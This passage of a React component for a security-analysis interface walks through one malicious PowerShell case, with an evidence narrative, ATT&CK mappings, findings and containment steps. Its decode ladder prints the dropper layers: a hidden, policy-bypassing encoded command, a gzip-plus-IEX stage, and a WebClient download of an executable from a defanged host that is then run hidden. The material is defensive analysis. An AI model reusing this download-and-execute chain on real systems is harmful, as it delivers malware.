          className="tb-btn"
          data-testid="labv2-theme"
          onClick={() => setTheme((t) => (t === "nightwatch" ? "daylight" : "nightwatch"))}
        >
          {theme === "nightwatch" ? "☾ NIGHTWATCH" : "☀ DAYLIGHT"}
        </button>
        <div className="avatar">JP</div>
      </header>

      <div className="body">
        {/* ── CASE SPINE ─────────────────────────────────────── */}
        <nav className="spine" data-testid="labv2-spine">
          <div className="lbl">Case spine</div>
          {STAGES.map((s) => (
            <button
              key={s.id}
              className={`stage ${s.state}`}
              data-testid={`stage-${s.id}`}
              onClick={() => showLens(s.lens)}
            >
              <div className="rail">
                <span className="node" />
              </div>
              <div className="txt">
                <div className="name">{s.name}</div>
                <div className="meta">{s.meta}</div>
              </div>
            </button>
          ))}
        </nav>

        {/* ── CANVAS ──────────────────────────────────────────── */}
        <main className="canvas">
          <div className="lensbar" role="tablist">
            {[
              { id: "source", label: "Source", k: "1" },
              { id: "story", label: "Story", k: "2" },
              { id: "behavior", label: "Behavior", k: "3" },
              { id: "attack", label: "ATT\u0026CK", k: "4" },
            ].map((b) => (
              <button
                key={b.id}
                className={`lens-btn${lens === b.id ? " on" : ""}`}
                data-testid={`lens-btn-${b.id}`}
                onClick={() => showLens(b.id)}
              >
                <span className="k">{b.k}</span>
                {b.label}
              </button>
            ))}
          </div>

          {/* STORY */}
          <section
            className={`lens${lens === "story" ? " on" : ""}`}
            id="story"
            ref={lensRefs.story}
            onScroll={onStoryScroll}
            data-testid="lens-story"
          >
            {/* Enhancement D · sticky summary */}
            <div className={`sticky-summary${showSticky ? " show" : ""}`}>
              <span className="pill">▲ MALICIOUS <span style={{ opacity: 0.7 }}>{CASE.confidenceDots}</span></span>
              <span className="st"><b>{CASE.stats.obs}</b> obs</span>
              <span className="st"><b>{CASE.stats.beh}</b> behaviors</span>
              <span className="st"><b>{CASE.stats.tech}</b> techniques</span>
              <span className="st"><b>{CASE.stats.unk}</b> unknowns</span>
            </div>

            {/* Enhancement I · universal intake */}
            <div className="intake" data-testid="labv2-intake">
              <div className="head">
                <h3>Investigate</h3>
                <span className="hint">Analyst voice · one field</span>
              </div>
              <textarea
                data-testid="labv2-intake-textarea"
                placeholder="Paste anything: PowerShell · CMD · Bash · Cisco XDR · CrowdStrike · Defender · Sentinel · QRadar · Splunk · Sysmon · Windows Events · JSON · XML · STIX · YARA · Sigma · email headers · IOC lists"
                value={intake}
                onChange={(e) => setIntake(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && (e.metaKey || e.ctrlKey)) {
                    e.preventDefault();
                    submitIntake();
                  }
                }}
              />
              <div className="row">
                <div className="accept">Auto-detects the artifact type · no dropdown · ⌘Enter to run</div>
                <button
                  className="analyze"
                  data-testid="labv2-analyze"
                  disabled={!intake.trim() || isAnalyzing}
                  onClick={submitIntake}
                >
                  {isAnalyzing ? "Analyzing…" : "Analyze"}
                </button>
              </div>
              {analyzeError ? <div className="err" data-testid="labv2-analyze-err">{analyzeError}</div> : null}
            </div>

            <div className="lens-head">
              <h2>What happened</h2>
              <p>Generated from the Canonical Investigation Object. Every clause is traceable.</p>
            </div>

            <div className="prose">
              <p className="lede">
                An obfuscated PowerShell command that downloads a remote executable to a temporary
                directory and runs it.
              </p>

              <p>
                The command was submitted with its execution policy bypassed and its window hidden{" "}
                <EvChip id="ev-01" selected={selEv === "ev-01"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                <EvChip id="ev-02" selected={selEv === "ev-02"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                . Neither flag is required for legitimate administration in this context.
              </p>

              <hr />

              <p>
                The payload was Base64-encoded in UTF-16LE, and inside it a second layer of gzip
                compression{" "}
                <EvChip id="ev-03" selected={selEv === "ev-03"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                . Two independent obfuscation layers is itself a signal — see the{" "}
                <a
                  className="inline-link"
                  href="#source"
                  onClick={(e) => {
                    e.preventDefault();
                    showLens("source");
                  }}
                >
                  decode ladder →
                </a>
              </p>

              <hr />

              <p>
                Once unwrapped, the script constructs a web client, fetches a file from a remote host,
                writes it into <span className="mono">%TEMP%</span> and starts it{" "}
                <EvChip id="ev-07" selected={selEv === "ev-07"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                <EvChip id="ev-08" selected={selEv === "ev-08"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                <EvChip id="ev-11" selected={selEv === "ev-11"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                . That download → write → execute sequence is what drives the verdict, not the individual commands.
              </p>

              <p className="quiet">
                The fetch host did not resolve at investigation time, so the payload itself was never
                retrieved. Two of four intelligence sources were unreachable. Both gaps are recorded in
                Unknowns and reduce confidence accordingly.
              </p>
            </div>

            {/* Enhancement J · clickable stats */}
            <div className="story-foot" data-testid="labv2-story-foot">
              <button className="stat" data-testid="stat-obs" onClick={() => showLens("source")}>
                <div className="lbl">Observations</div>
                <div className="v num">{CASE.stats.obs}</div>
              </button>
              <button className="stat" data-testid="stat-beh" onClick={() => showLens("behavior")}>
                <div className="lbl">Behaviors</div>
                <div className="v num">{CASE.stats.beh}</div>
              </button>
              <button className="stat" data-testid="stat-tech" onClick={() => showLens("attack")}>
                <div className="lbl">Techniques</div>
                <div className="v num">{CASE.stats.tech}</div>
              </button>
              <button className="stat" data-testid="stat-unk">
                <div className="lbl">Unknowns</div>
                <div className="v num">{CASE.stats.unk}</div>
              </button>
              <div className="stat">
                <div className="lbl">Elapsed</div>
                <div className="v num">{CASE.stats.elapsed}</div>
              </div>
            </div>
          </section>

          {/* SOURCE (decode ladder) */}
          <section className={`lens${lens === "source" ? " on" : ""}`} id="source" ref={lensRefs.source} data-testid="lens-source">
            <div className="lens-head">
              <h2>Decode ladder</h2>
              <p>The recipe the engine already found. Climb it to audit each transform.</p>
            </div>

            <div className="rung">
              <div className="rung-head">
                <span className="l">L0</span>
                <span className="n">Submitted</span>
                <span className="m">sha256 4f2a91c7… · 1.2 KB</span>
              </div>
              <div
                className="code"
                dangerouslySetInnerHTML={{
                  __html:
                    "powershell.exe <b>-nop</b> <b>-w hidden</b> -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA…",
                }}
              />
            </div>
            <div className="transform">
              <span className="arrow">↓</span> base64 · utf-16le
              <span className="conf">confident</span>
            </div>

            <div className="rung">
              <div className="rung-head">
                <span className="l">L1</span>
                <span className="n">Decoded</span>
                <span className="m">840 B</span>
              </div>
              <div
                className="code"
                dangerouslySetInnerHTML={{
                  __html: `$b=[Convert]::FromBase64String($p)
$m=New-Object IO.MemoryStream(,$b)
$g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress)
$s=New-Object IO.StreamReader($g)
<b>IEX $s.ReadToEnd()</b>`,
                }}
              />
            </div>
            <div className="transform">
              <span className="arrow">↓</span> gzip inflate
              <span className="conf">confident</span>
            </div>

            <div className="rung">
              <div className="rung-head">
                <span className="l">L2</span>
                <span className="n">Decoded</span>
                <span className="m">612 B · terminal layer</span>
              </div>
              <div
                className="code"
                dangerouslySetInnerHTML={{
                  __html: `$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')
<b>$wc.DownloadFile('hxxp://cdn-update[.]tld/a.exe',"$env:TEMP\\a.exe")</b>
<b>Start-Process "$env:TEMP\\a.exe" -WindowStyle Hidden</b>`,
                }}
              />
            </div>
            <div className="transform">
              <span className="arrow">↓</span> no further transform detected
              <span className="conf">terminal</span>
            </div>
          </section>

          {/* BEHAVIOR */}
          <section className={`lens${lens === "behavior" ? " on" : ""}`} id="behavior" ref={lensRefs.behavior} data-testid="lens-behavior">
            <div className="lens-head">
              <h2>Behavior graph</h2>
              <p>Vertical position encodes capability. The descending chain is the dropper silhouette.</p>
            </div>
            <div className="graph-wrap">
              <svg viewBox="0 0 860 468" role="img" aria-label="Causal behavior graph across capability lanes">
                <defs>
                  <marker id="ah" markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto">
                    <path d="M0,0 L7,3.5 L0,7 z" fill="currentColor" />
                  </marker>
                </defs>
                <g>
                  <rect className="lane-bg" x="0" y="6" width="860" height="96" rx="6" />
                  <rect className="lane-bg" x="0" y="126" width="860" height="96" rx="6" />
                  <rect className="lane-bg" x="0" y="246" width="860" height="96" rx="6" />
                  <rect className="lane-bg" x="0" y="366" width="860" height="96" rx="6" />
                  <text className="lane-lbl" x="12" y="24">EVADE</text>
                  <text className="lane-lbl" x="12" y="144">DECODE</text>
                  <text className="lane-lbl" x="12" y="264">ACQUIRE</text>
                  <text className="lane-lbl" x="12" y="384">EXECUTE · PERSIST</text>
                </g>
                <g className="edge">
                  <path d="M200,74 C260,74 250,150 300,158" markerEnd="url(#ah)" />
                  <path d="M200,182 L286,182" markerEnd="url(#ah)" />
                </g>
                <g className="edge hot">
                  <path d="M420,182 C470,182 470,270 520,278" markerEnd="url(#ah)" />
                  <path d="M700,296 C740,296 740,380 700,398" markerEnd="url(#ah)" />
                  <path d="M520,416 L456,416" markerEnd="url(#ah)" />
                </g>
                <g>
                  <rect className="n-box" x="40" y="48" width="160" height="52" />
                  <text className="n-t" x="56" y="70">Hide window</text>
                  <text className="n-s" x="56" y="88">-w hidden · ev-02</text>

                  <rect className="n-box" x="40" y="156" width="160" height="52" />
                  <text className="n-t" x="56" y="178">Bypass policy</text>
                  <text className="n-s" x="56" y="196">-nop · ev-01</text>

                  <rect className="n-box" x="286" y="132" width="134" height="52" />
                  <text className="n-t" x="300" y="154">Base64 decode</text>
                  <text className="n-s" x="300" y="172">utf-16le · ev-03</text>

                  <rect className="n-box" x="286" y="196" width="134" height="52" opacity=".92" />
                  <text className="n-t" x="300" y="218">Gzip inflate</text>
                  <text className="n-s" x="300" y="236">layer 2 · ev-04</text>

                  <rect className="n-box hot" x="520" y="252" width="180" height="52" />
                  <text className="n-t" x="536" y="274">Remote fetch</text>
                  <text className="n-s" x="536" y="292">cdn-update[.]tld · ev-07</text>

                  <rect className="n-box hot" x="520" y="372" width="180" height="52" />
                  <text className="n-t" x="536" y="394">Write to %TEMP%</text>
                  <text className="n-s" x="536" y="412">a.exe · ev-08</text>

                  <rect className="n-box hot" x="276" y="390" width="180" height="52" />
                  <text className="n-t" x="292" y="412">Start process</text>
                  <text className="n-s" x="292" y="430">hidden · ev-11</text>
                </g>
                <text className="chain-lbl" x="276" y="462">
                  CHAIN: DOWNLOAD → WRITE → EXECUTE  ·  drives verdict
                </text>
              </svg>
            </div>
          </section>

          {/* ATT&CK */}
          <section className={`lens${lens === "attack" ? " on" : ""}`} id="attack" ref={lensRefs.attack} data-testid="lens-attack">
            <div className="lens-head">
              <h2>Observed path</h2>
              <p>Only tactics present in this case. Full matrix and Navigator JSON on demand.</p>
            </div>
            <div className="tactics">
              <div className="tcol">
                <div className="lbl">Execution</div>
                <button className="tcard">
                  <div className="id">T1059.001</div>
                  <div className="nm">PowerShell</div>
                  <div className="row">
                    <EvChip id="ev-01" selected={selEv === "ev-01"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                    <EvChip id="ev-04" selected={selEv === "ev-04"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                    <span className="conf-dots" style={{ marginLeft: "auto" }}>●●●●○</span>
                  </div>
                </button>
              </div>
              <div className="tcol">
                <div className="lbl">Defense evasion</div>
                <button className="tcard">
                  <div className="id">T1027</div>
                  <div className="nm">Obfuscated files or information</div>
                  <div className="row">
                    <EvChip id="ev-03" selected={selEv === "ev-03"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                    <span className="conf-dots" style={{ marginLeft: "auto" }}>●●●●●</span>
                  </div>
                </button>
                <button className="tcard">
                  <div className="id">T1564.003</div>
                  <div className="nm">Hidden window</div>
                  <div className="row">
                    <EvChip id="ev-02" selected={selEv === "ev-02"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                    <span className="conf-dots" style={{ marginLeft: "auto" }}>●●●●○</span>
                  </div>
                </button>
              </div>
              <div className="tcol">
                <div className="lbl">Command &amp; control</div>
                <button className="tcard">
                  <div className="id">T1105</div>
                  <div className="nm">Ingress tool transfer</div>
                  <div className="row">
                    <EvChip id="ev-07" selected={selEv === "ev-07"} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                    <span className="conf-dots" style={{ marginLeft: "auto" }}>●●●●○</span>
                  </div>
                </button>
              </div>
              <div className="tcol">
                <div className="lbl">Persistence</div>
                {/* Enhancement H · better empty state */}
                <div className="tempty" data-testid="attack-empty">
                  No ATT&amp;CK techniques were confidently identified for this tactic. This does not imply benign activity.
                </div>
              </div>
            </div>
          </section>
        </main>

        {/* ── FINDINGS PANEL ─────────────────────────────────── */}
        <aside className="findings" data-testid="labv2-findings">
          <div className="sect">
            <div className="sect-h"><span className="lbl">Verdict ledger</span></div>
            <div className="ledger">
              <div className="ledger-top">
                <div className="v">▲ MALICIOUS</div>
                <div className="c">
                  <span className="lbl">Confidence</span>
                  <span className="conf-dots">●●●●○</span>
                  <span className="lbl" style={{ color: "var(--fg2)" }}>High</span>
                </div>
              </div>

              {[
                { sign: "+++", cls: "up", t: "Download → write → execute chain", evs: ["ev-07", "ev-08", "ev-11"] },
                { sign: "++", cls: "up", t: "Two-layer obfuscation (b64 → gzip)", evs: ["ev-03"] },
                { sign: "++", cls: "up", t: "Policy bypass with hidden window", evs: ["ev-01", "ev-02"] },
                { sign: "+", cls: "up", t: "Non-standard TLD on fetch host", evs: ["ev-09"] },
              ].map((r, i) => (
                <button key={i} className="lrow" data-testid={`ledger-row-${i}`}>
                  <span className={`sign ${r.cls}`}>{r.sign}</span>
                  <span>
                    <span className="t">{r.t}</span>
                    <span className="e">
                      {r.evs.map((id) => (
                        <EvChip key={id} id={id} selected={selEv === id} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                      ))}
                    </span>
                  </span>
                </button>
              ))}

              <button className="lrow">
                <span className="sign dn">–</span>
                <span>
                  <span className="t">No known-bad hash match</span>
                  <span className="e"><span className="ev">intel · 5 src</span></span>
                </span>
              </button>
              <button className="lrow">
                <span className="sign q">?</span>
                <span>
                  <span className="t">C2 host unresolved — target offline</span>
                  <span className="e"><span className="ev">unknown-1</span></span>
                </span>
              </button>
              <div className="ledger-note">
                Behavior-first: the verdict derives from the chain, not from command matching. Ruleset 2026.07.3.
              </div>
              <div className="ledger-foot">
                <button className="corr">Correct</button>
                <button className="corr">Partial</button>
                <button className="corr">Wrong</button>
              </div>
            </div>
          </div>

          <div className="sect">
            <div className="sect-h"><span className="lbl">Findings</span><span className="c">4</span></div>
            {[
              { g: "crit", gly: "▲", t: "Download-write-execute chain", sub: "behavior · 3 linked nodes", evs: ["ev-07", "ev-08", "ev-11"] },
              { g: "crit", gly: "▲", t: "Dual-layer obfuscation", sub: "decode · 2 transforms", evs: ["ev-03"] },
              { g: "high", gly: "◆", t: "Execution policy bypassed, window hidden", sub: "evidence · flags", evs: ["ev-01", "ev-02"] },
              { g: "med", gly: "●", t: "Fetch host on non-standard TLD", sub: "intel · 2 of 4 sources", evs: ["ev-09"] },
            ].map((f, i) => (
              <button key={i} className="frow" data-testid={`finding-${i}`}>
                <span className={`g ${f.g}`}>{f.gly}</span>
                <span>
                  <span className="t">{f.t}</span>
                  <span className="sub">{f.sub}</span>
                  <span className="e">
                    {f.evs.map((id) => (
                      <EvChip key={id} id={id} selected={selEv === id} onEnter={onEvEnter} onLeave={onEvLeave} onClick={onEvClick} />
                    ))}
                  </span>
                </span>
              </button>
            ))}
          </div>

          <div className="sect">
            <div className="sect-h"><span className="lbl">Unknowns</span><span className="c">2</span></div>
            <button className="frow">
              <span className="g unk">○</span>
              <span>
                <span className="t">C2 host did not resolve</span>
                <span className="sub">target offline at 14:22 → retry / sandbox</span>
              </span>
            </button>
            <button className="frow">
              <span className="g unk">○</span>
              <span>
                <span className="t">Payload never retrieved</span>
                <span className="sub">no hash to check against intel</span>
              </span>
            </button>
          </div>

          <div className="sect">
            <div className="sect-h"><span className="lbl">Next actions</span><span className="c">3</span></div>
            <button className="act">
              <div className="h">
                <span className="n">Block cdn-update[.]tld at egress</span>
                <span className="w">Contain now</span>
              </div>
              <div className="b">A download-write-execute chain fetched from this host. Affects 1 observed host.</div>
            </button>
            <button className="act">
              <div className="h">
                <span className="n">Hunt %TEMP%\a.exe across estate</span>
                <span className="w">Contain now</span>
              </div>
              <div className="b">Copy-ready KQL generated from the behavior chain.</div>
            </button>
            <button className="act">
              <div className="h">
                <span className="n">Re-run when host is reachable</span>
                <span className="w later">Investigate next</span>
              </div>
              <div className="b">Resolves both unknowns and would raise confidence to conclusive.</div>
            </button>
          </div>
        </aside>
      </div>

      {/* ── EVIDENCE BAR ────────────────────────────────────── */}
      <footer className="evbar" data-testid="labv2-evbar">
        <div className="trail">
          <span className="lbl id" data-testid="evbar-id">{selEv}</span>
          <span className="lbl" data-testid="evbar-trail">{sel.t}</span>
          <span className="lbl span" data-testid="evbar-span">{sel.s}</span>
        </div>
        <div
          className="code"
          data-testid="evbar-code"
          dangerouslySetInnerHTML={{ __html: sel.c }}
        />
        <div className="supports">
          <span className="lbl">Supports</span>
          {sel.sup.map((s) => (
            <span className="tag" key={s}>{s}</span>
          ))}
        </div>
      </footer>

      {/* ── Evidence hover popover (Enhancement E) ──────────── */}
      {pop && EV[pop.id] ? (
        <div
          className="ev-pop show"
          style={{ top: pop.top, left: pop.left, transform: "translate(0, -100%)" }}
        >
          <div className="id">{pop.id}</div>
          <div
            className="snip"
            dangerouslySetInnerHTML={{ __html: EV[pop.id].c }}
          />
          <div className="sups">
            {EV[pop.id].sup.map((s) => (
              <span className="tag" key={s}>{s}</span>
            ))}
          </div>
        </div>
      ) : null}
    </div>
  );
}
